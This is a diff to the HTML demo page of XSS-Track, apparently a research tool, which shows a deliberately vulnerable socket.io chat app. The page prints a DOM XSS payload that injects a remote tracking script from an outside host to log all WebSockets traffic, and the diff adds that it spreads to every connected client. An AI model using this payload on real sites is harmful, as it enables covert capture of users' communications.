@@ -49,20 +49,13 @@
     This is an example of <a href="http://blog.kotowicz.net/2010/11/xss-track-how-to-quietly-track-whole.html">XSS-Track</a> ability to dump <a href="http://en.wikipedia.org/wiki/WebSockets">WebSockets</a> communication.
     </p>
     <p>This is a modified vulnerable version of <a href="https://github.com/LearnBoost/Socket.IO-node">socket.io</a> chat application</p>
-    <h2>Set up</h2>
-    <p>You need to launch a WebSockets server to test it. For this you need to:</p>
-    <ol>
-      <li>install <a href="http://nodejs.org/#build">node.js</a> framework</li>
-      <li>run the server: <pre>
-      $ cd path/to/vuln/socket.io/example
-      $ node server.js</pre></li>
-      <li>run the client in WebSockets compatible browser (Chrome is a safe bet): <a href="http://localhost:8080">http://localhost:8080</a></li>
-    </ol>
+    <p>You need a working WebSockets server and WebSockets compatible browser to test it, see <a href="/readme.html">readme</a> for details.</p>
     <h2>Injection</h2>
     <p>The chat message is vulnerable to DOM XSS, use e.g. the following payload to test it:</p>
     <pre>
     &lt;img src=a onerror="s=document.createElement('script');s.src='http://kotowicz.net/xss-track/track.js?debug=1&amp;websocket=1';document.body.appendChild(s);"&gt;
     </pre>
+    <p>(The payload will also distribute to all clilents connected to the chat)</p>
     <p>After the injection all WebSockets communication will be logged to console (Ctrl-Shift-I to see the console in Chrome)</p>
     <style>
       #chat { height: 300px; overflow: auto; width: 800px; border: 1px solid #eee; font: 13px Helvetica, Arial; }
